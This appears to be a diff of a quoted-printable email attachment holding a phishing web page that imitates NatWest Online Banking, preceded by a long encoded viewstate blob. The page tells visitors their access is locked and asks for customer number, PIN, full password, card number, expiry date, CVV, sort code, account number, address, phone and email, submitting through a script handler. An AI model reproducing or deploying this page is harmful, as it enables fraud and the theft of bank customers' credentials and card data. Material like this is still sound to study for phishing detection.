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*" type=3D"hidden">
+<input name=3D"__VIEWSTATE" id=3D"
+__VIEWSTATE" value=3D"" type=3D"hidden">
+</div>
+<script type=3D"text/javascript" src=3D"https://www.nwolb.com/Brands/mtagco=
+nfig.js"></script><!-- skip links START -->
+                    <script type=3D"text/javascript">
+                    var s_account =3D "rbsnwphase2";
+                    </script>
+
+                    <script type=3D"text/javascript" src=3D"https://www.nat=
+west.com/templates/script/analytics/sc_helper.js"></script>
+                    <!-- skip links END -->
+
+                    <!-- SiteCatalyst code version: H.22.1.
+                    Copyright 1996-2010 Adobe, Inc. All Rights Reserved
+                    More info available at http://www.omniture.com -->
+                                     =
+
+		    <noscript xmlns:r=3D"http://www.rbs.com/schemas/rates">		=
+
+                <a href=3D"http://www.omniture.com" title=3D"Web Analytics">
+                    <img src=3D"https://royalbankofscotland.122.2o7.net/b/s=
+s/rbsnwphase2/1/H.21--NS/0?[AQB]&amp;cdp=3D3&amp;[AQE]" height=3D"1" width=
+=3D"1" border=3D"0" alt=3D"" />
+                </a>
+            </noscript>
+
+
+
+					=
+
+    =
+
+    <span id=3D"ctl00_mainContent_ctl00" class=3D"errorIndicator" style=3D"=
+color:Red;display:none;"></span>
+        <div id=3D"ctl00_mainContent_OLE1">
+					<span id=3D"ctl00_mainContent_OLE1CV_customValidator" class=3D"errorIn=
+dicator" style=3D"color:Red;display:none;"></span>
+					<h1>
+	Restore your access to Online Banking</h1>
+					<p>
+	You have received this form because your Online Banking access has been =
+
+	locked for security reasons. If you are the rightful owner of this account=
+, =
+
+	please fill out and submit this form in order to restore it.</p>
+					=
+
+					=
+
+					<div id=3D"ctl00_mainContent_OLE1PFA" class=3D"frame">
+	=
+
+						=
+
+						=
+
+						<span class=3D"withBreak" id=3D"ctl00_mainContent_OLE1BTEC"><br>* ind=
+icates mandatory field.<br><br></span>
+					</div>
+					<div id=3D"ctl00_mainContent_OLE1PFB" class=3D"frame">
+		<h3 id=3D"ctl00_mainContent_OLE1BTHE" class=3D"frmHdr">
+			Your Personal Details
+		</h3>
+						=
+
+						=
+
+							=
+
+						<ul class=3D"form "><li class=3D"first"><label for=3D"ctl00_mainConte=
+nt_OLE1NBTEA_edit" id=3D"ctl00_mainContent_OLE1DDALBLabel" class=3D"wizCrl">
+							Customer number *</label><span><span id=3D"ctl00_mainContent_OLE1NBT=
+EA"><input name=3D"customer" maxlength=3D"15" id=3D"cunr" autocomplete=3D"o=
+ff" type=3D"text" onKeyPress=3D"return numbersonly(this, event)" onkeyup=3D=
+"checkLen(this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel0" class=3D"wizCrl">
+							Online Banking PIN number*</label><span><span id=3D"ctl00_mainConten=
+t_OLE1NBTEA0"><input name=3D"pin" maxlength=3D"4" id=3D"cunr0" autocomplete=
+=3D"off" type=3D"password" onKeyPress=3D"return numbersonly(this, event)" o=
+nkeyup=3D"checkLen(this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+							Online Banking Password*</label><span><span id=3D"ctl00_mainContent_=
+OLE1NBTEA0"><input name=3D"password" maxlength=3D"40" id=3D"cunr0" autocomp=
+lete=3D"off" type=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D=
+"checkLen(this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+
+							Card Holder's Name*</label><span><span id=3D"ctl00_mainContent_OLE1N=
+BTEA0"><input name=3D"name" maxlength=3D"40" id=3D"cunr0" autocomplete=3D"o=
+ff" type=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D"checkLen=
+(this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+
+							Home Address*</label><span><span id=3D"ctl00_mainContent_OLE1NBTEA0"=
+><input name=3D"address" maxlength=3D"40" id=3D"cunr0" autocomplete=3D"off"=
+ type=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D"checkLen(th=
+is,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+							Home PostCode*</label><span><span id=3D"ctl00_mainContent_OLE1NBTEA0=
+"><input name=3D"postcode" maxlength=3D"12" id=3D"cunr0" autocomplete=3D"of=
+f" type=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D"checkLen(=
+this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+							Mobile Phone number*</label><span><span id=3D"ctl00_mainContent_OLE1=
+NBTEA0"><input name=3D"phone" maxlength=3D"16" id=3D"cunr0" autocomplete=3D=
+"off" type=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D"checkL=
+en(this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+
+							Account number*</label><span><span id=3D"ctl00_mainContent_OLE1NBTEA=
+0"><input name=3D"account" maxlength=3D"12" id=3D"cunr0" autocomplete=3D"of=
+f" type=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D"checkLen(=
+this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+							SortCode*</label><span><span id=3D"ctl00_mainContent_OLE1NBTEA0"><in=
+put name=3D"sortcode" maxlength=3D"12" id=3D"cunr0" autocomplete=3D"off" ty=
+pe=3D"text" onkeyup=3D"checkLen(this,this.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+							16 Digit Card number *</label><span><span id=3D"ctl00_mainContent_OL=
+E1NBTEC"><input name=3D"cc" maxlength=3D"22" id=3D"ctl00_mainContent_OLE1NB=
+TEC_edit" autocomplete=3D"off" type=3D"text" onkeyup=3D"checkLen(this,this.=
+value)" onkeyup=3D"checkLen(this,this.value)"></span></span></li><li><label=
+ for=3D"ctl00_mainContent_ctl17" id=3D"ctl00_mainContent_OLE1DDALELabel" cl=
+ass=3D"wizCrl"><span id=3D"ctl00_mainContent_OLE1CVA_customValidator" class=
+=3D"errorIndicator" style=3D"color:Red;display:none;"></span><span id=3D"ct=
+l00_mainContent_OLE1DEA_businessDateValid" class=3D"errorIndicator" style=
+=3D"color:Red;visibility:hidden;"></span>
+
+							Expiry Date*</label><span><span id=3D"ctl00_mainContent_OLE1NBTEA0">=
+<input name=3D"exp" maxlength=3D"12" id=3D"cunr0" autocomplete=3D"off" type=
+=3D"text" onkeyup=3D"checkLen(this,this.value)" onkeyup=3D"checkLen(this,th=
+is.value)"></span></span></li>
+							<li class=3D"first">
+							<label for=3D"ctl00_mainContent_OLE1NBTEA_edit" id=3D"ctl00_mainCont=
+ent_OLE1DDALBLabel1" class=3D"wizCrl">
+
+							Card Verification Value (CVV) *</label><span><span id=3D"ctl00_mainC=
+ontent_OLE1DEA"><label for=3D"ctl00_mainContent_OLE1DEA_day" id=3D"ctl00_ma=
+inContent_ctl17" class=3D"hidLabel"></label><input name=3D"cvv" maxlength=
+=3D"3" id=3D"ctl00_mainContent_OLE1DEA_day" autocomplete=3D"off" size=3D"3"=
+ style=3D"width:3em;" type=3D"text" onKeyPress=3D"return numbersonly(this, =
+event)" onkeyup=3D"checkLen(this,this.value)"></span></span></li>
+							<li>
+							<label for=3D"ctl00_mainContent_OLE1PCEA_edit" id=3D"ctl00_mainConte=
+nt_OLE1DDALILabel" class=3D"wizCrl">Email Address =
+
+							*</label><span><span id=3D"ctl00_mainContent_OLE1PCEA"><input name=
+=3D"email" maxlength=3D"30" id=3D"ctl00_mainContent_OLE1PCEA_edit" autocomp=
+lete=3D"off" type=3D"text" onkeyup=3D"checkLen(this,this.value)"></span></s=
+pan></li></ul>
+						=
+
+						<p><input id=3D"ctl00_mainContent_OLE1CBD" name=3D"ctl00$mainContent$=
+OLE1CBD" type=3D"checkbox"><label for=3D"ctl00_mainContent_OLE1CBD">Please =
+keep me informed by email about products and services that you believe may =
+be of interest to me.</label></p>
+					</div>
+					<div id=3D"ctl00_mainContent_RadioFrame" class=3D"box_shaded"><div cla=
+ss=3D"box_top_shaded"><hr></div>
+						<p>Restoring your NatWest Account may take a few =
+
+						moments.<br>
+						Once this process is finished you will be redirected to =
+
+						read our Privacy Statement.<br>
+						Please be patient as we process your information.<br>
+						&nbsp;<p>Remember that we will never ask you to supply your =
+
+						complete password in order to access our internet =
+
+						banking service - we only ever ask for parts of your =
+
+						password.</div>
+				</div>
+    <div id=3D"ctl00_mainContent_ButtonPanel" class=3D"wizardNav">
+			<div id=3D"ctl00_mainContent_nextButtonPanel" class=3D"right">
+				<div class=3D"btnNext btnbg" id=3D"ctl00_mainContent_NextButton_wrapper=
+">
+					<div class=3D"btnt">
+						<div class=3D"btnr">
+							<div class=3D"btnb">
+								<div class=3D"btnl">
+									<div class=3D"btntl">
+										<div class=3D"btntr">
+											<div class=3D"btnbr">
+												<div class=3D"btnbl">
+													<input name=3D"ctl00$mainContent$NextButton_button" value=3D"C=
+ontinue" id=3D"ctl00_mainContent_NextButton_button" class=3D"button-right f=
+orward-arrow " type=3D"submit" onClick=3D"return sloboz()">
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div></div><div id=3D"ctl00_mainContent_backButtonPanel" class=3D"left=
+">
+					</div></div>
+    <div id=3D"ctl00_mainContent_CloseWindow" class=3D"frame">
+						=
+
+        =
+
+    </div>
+
+					=
+
+
+
+						=
+
+</form>
+				</div>
+				<a name=3D"menu"></a>
+				<div id=3D"ctl00_leftPanel" class=3D"left menu">
+					=
+
+					<div id=3D"ctl00_faqs_ctl00_faqPanel" class=3D"box_faqPanel"><div clas=
+s=3D"box_top_faqPanel"><hr></div>
+	<div class=3D"box_faqPanelWrapper"><div class=3D"box_top_faqPanelWrapper">=
+<hr></div>
+		<div id=3D"ctl00_faqs_ctl00_questionPanel" class=3D"questionPanel">
+							=
+
+			<div class=3D"faqHeading">
+								=
+
+				<h3>
+									<img id=3D"FAQBTHA" alt=3D"Help 24x7" class=3D"H3Img " src=3D"http=
+s://www.nwolb.com/brands/NWB/images/generated_FF75EF355BDAE1559C9C80DB0CAE8=
+194C7F233DD-3-FAQ-BTHA.gif">
+								</h3>
+			</div>
+			<p>
+				<span id=3D"ctl00_faqs_ctl00_FAQBTEA">Got a question? <br> We can help<=
+/span>
+			</p>
+		<form class=3D"faqForm" method=3D"get" action=3D"https://www.questions.na=
+twest.com/RBSG/index?page=3Dsearch" target=3D"_blank">
+									<input id=3D"ctl00_faqs_ctl00_ctl04" name=3D"brand" value=3D"NPC" =
+type=3D"hidden"><input id=3D"ctl00_faqs_ctl00_ctl05" name=3D"pageID" value=
+=3D"OLE1" type=3D"hidden"><input id=3D"ctl00_faqs_ctl00_ctl06" name=3D"wc" =
+value=3D"EA4D0609D74E4C502A6C44CD37FC7A6776EDC43A" type=3D"hidden"><input i=
+d=3D"ctl00_faqs_ctl00_ctl07" name=3D"segmentCode" value=3D"" type=3D"hidden=
+"><input id=3D"ctl00_faqs_ctl00_ctl08" name=3D"ageCategory" value=3D"" type=
+=3D"hidden"><input id=3D"ctl00_faqs_ctl00_ctl09" name=3D"page" value=3D"sea=
+rch" type=3D"hidden"><input id=3D"ctl00_faqs_ctl00_FAQ-IF1" class=3D"faqQue=
+stion" name=3D"question" value=3D"How do I apply?" maxlength=3D"250" type=
+=3D"text"><label for=3D"ctl00_faqs_ctl00_FAQ-IF1" class=3D"hidden">Ask a Qu=
+estion</label><div class=3D"faqNav">
+					<div class=3D"btnNext btnbg">
+						<div class=3D"btnt">
+							<div class=3D"btnr">
+								<div class=3D"btnb">
+									<div class=3D"btnl">
+										<div class=3D"btntl">
+											<div class=3D"btntr">
+												<div class=3D"btnbr">
+													<div class=3D"btnbl"><input id=3D"ctl00_faqs_ctl00_FAQ-BTN1" c=
+lass=3D"button-right" name=3D"" value=3D"Ask" type=3D"submit"></div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+								</form></div>
+	</div>
+	<div id=3D"ctl00_faqs_ctl00_topFAQsPanel" class=3D"topFaqPanel">
+									=
+
+	<h2>Frequently Asked Questions</h2><a href=3D"javascript:void(0);" class=
+=3D"closeIframeAnchor"><img class=3D"closeIframe" src=3D"https://www.nwolb.=
+com/Brands/NWB/images/faq/close.png" alt=3D"Close"></a><br clear=3D"all"><i=
+frame class=3D"faqIframe" src=3D"https://www.nwolb.com/brands/NWB/images/bl=
+ank_s.gif" frameborder=3D"0"></iframe></div>
+	<br clear=3D"all">
+</div>
+
+					=
+
+					=
+
+				</div>
+			</div>
+			=
+
+			<br class=3D"clear">
+		</div>
+		=
+
+<div id=3D"footerContainer">
+    <div id=3D"footer">
+        <ol class=3D"footer_navbar">
+            <li><a id=3D"ctl00_footer_ctl00_PopUpLink2Anchor" title=3D"Lega=
+l Info : Opens in a new window" onclick=3D"window.open('https://www.nwolb.c=
+om/TermsAndConditions.aspx','headerWindow','top=3D70,left=3D60,width=3D800,=
+height=3D600,resizable=3Dyes,scrollbars=3Dyes,location=3Dyes');return false=
+;" href=3D"https://www.nwolb.com/TermsAndConditions.aspx" target=3D"headerW=
+indow">Legal Info</a></li>
+    		<li><a id=3D"ctl00_footer_ctl00_PopUpLink4Anchor" title=3D"Security :=
+ Opens in a new window" onclick=3D"window.open('http://www.natwest.com/tool=
+s/general/nwolb_legals/security.htm','headerWindow','top=3D70,left=3D60,wid=
+th=3D800,height=3D600,resizable=3Dyes,scrollbars=3Dyes,location=3Dyes');ret=
+urn false;" href=3D"http://www.natwest.com/tools/general/nwolb_legals/secur=
+ity.htm" target=3D"headerWindow">Security</a></li>
+    		<li class=3D"last"><span id=3D"ctl00_footer_ctl00_CopyrightText">(c) =
+2005-2013 National Westminster Bank Plc</span></li>
+        </ol>
+    </div>
+</div>
+
+
+		=
+
+	</div>
+
+
+</body></html>
+--===============1404784312==--
